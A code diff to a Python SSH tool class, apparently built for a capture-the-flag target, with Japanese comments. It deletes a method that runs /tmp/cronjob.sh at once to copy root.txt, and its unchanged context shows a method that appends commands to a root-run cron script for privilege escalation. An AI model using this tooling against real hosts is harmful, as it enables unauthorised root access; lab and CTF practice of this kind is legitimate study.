@@ -177,31 +177,7 @@ class SSHExplorer:
 
 
 
-    async def execute_cron_copy_immediately(self, host: str, port: int, username: str, password: str) -> str:
-        """cronジョブを即座に実行してroot.txtをコピーします"""
-        async def task(conn):
-            try:
-                # /tmp/cronjob.shが存在するかチェック
-                script_exists = await self._run_remote_command(conn, 'test -f /tmp/cronjob.sh && echo "exists" || echo "not found"')
-                
-                if not script_exists:
-                    return "エラー: /tmp/cronjob.shが見つかりません。まずcronジョブを作成してください。"
-                
-                # スクリプトを即座に実行
-                result = await conn.run('/tmp/cronjob.sh', check=False)
-                
-                return f"""✅ cronスクリプトを即座に実行しました！
 
-📋 実行結果:
-{result.stdout}
-
-💡 cronジョブが実行されました。ファイルの確認は別途行ってください。
-"""
-                
-            except Exception as e:
-                return f"エラー: スクリプトの実行に失敗しました。{str(e)}"
-
-        return await self._execute_exploration(host, port, username, password, task)
 
     async def add_root_privilege_escalation(self, host: str, port: int, username: str, password: str) -> str:
         """cronjob.shにroot権限取得のためのコマンドを追記します"""
@@ -244,7 +220,6 @@ chmod 644 /home/{username}/root.txt
 {updated_content}
 
 ⏰ 次のcron実行時（毎分）にroot権限でコマンドが実行されます。
-💡 即座に実行したい場合は、別途ssh_execute_cron_copy_immediatelyを実行してください。
 """
                 
             except Exception as e:
